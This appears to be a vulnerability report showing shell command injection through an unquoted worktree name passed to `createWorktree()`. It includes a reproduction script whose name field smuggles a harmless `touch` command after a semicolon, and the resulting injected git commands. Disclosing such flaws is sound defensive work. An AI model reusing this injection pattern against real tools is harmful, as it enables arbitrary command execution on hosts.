# Worktree create executes shell commands embedded in an unquoted worktree name

## Summary

`createWorktree()` concatenates the caller-supplied `name` into shell command strings for `git worktree remove`, `git branch -D`, and `git worktree add` without quoting or argv separation. A name containing shell syntax therefore executes arbitrary commands through the provided execution dependency.

## Reproduction

From the repository root, create a disposable git repository and call the exported worktree function with a name containing a harmless `touch` command. The supplied `exec` implementation mirrors the package contract by executing each generated command in a shell:

```sh
repo=$PWD
probe=$(mktemp -d)
mkdir -p "$probe/repo" "$probe/worktrees"
(
  cd "$probe/repo"
  git init -q -b main
  git config user.email probe@example.invalid
  git config user.name Probe
  printf x > a
  git add a
  git commit -q -m init
)

cat > "$probe/repro.mts" <<EOF
import { execSync } from "node:child_process";
import { createWorktree } from "file://$PWD/packages/worktree/src/create.ts";

const fs = {
  async readFile() { const error = Object.assign(new Error("missing"), { code: "ENOENT" }); throw error; },
  async mkdir() {},
  async writeFile() {}
};
await createWorktree({
  cwd: "$probe/repo",
  name: 'safe; touch "$probe/injected"; #',
  baseBranch: "main",
  source: "probe",
  agent: "codex",
  registryFile: "$probe/registry.yaml",
  worktreeDir: "$probe/worktrees",
  deps: {
    fs,
    async exec(command) {
      console.log(command);
      execSync(command, { cwd: "$probe/repo", stdio: "ignore", shell: "/bin/sh" });
      return { stdout: "", stderr: "" };
    }
  }
});
EOF

"$repo/node_modules/.bin/tsx" "$probe/repro.mts" || true
ls -l "$probe/injected"

nl -ba packages/worktree/src/create.ts | sed -n '20,56p'
```

## Observed Behavior

The generated commands contain the injected shell expression and create the marker file:

```text
git worktree remove <probe>/worktrees/safe; touch "<probe>/injected"; # --force
git branch -D poe-code/safe; touch "<probe>/injected"; #
git worktree add -b poe-code/safe; touch "<probe>/injected"; # <probe>/worktrees/safe; touch "<probe>/injected"; # main
<probe>/injected exists
```

## Expected Behavior

Worktree names and derived branch or checkout paths should be passed as individual process arguments or otherwise safely encoded. Shell metacharacters in a name must not execute commands.

## Impact

Any caller able to supply a worktree name to this exported infrastructure API can execute arbitrary shell commands in the host repository context, before or during worktree creation.
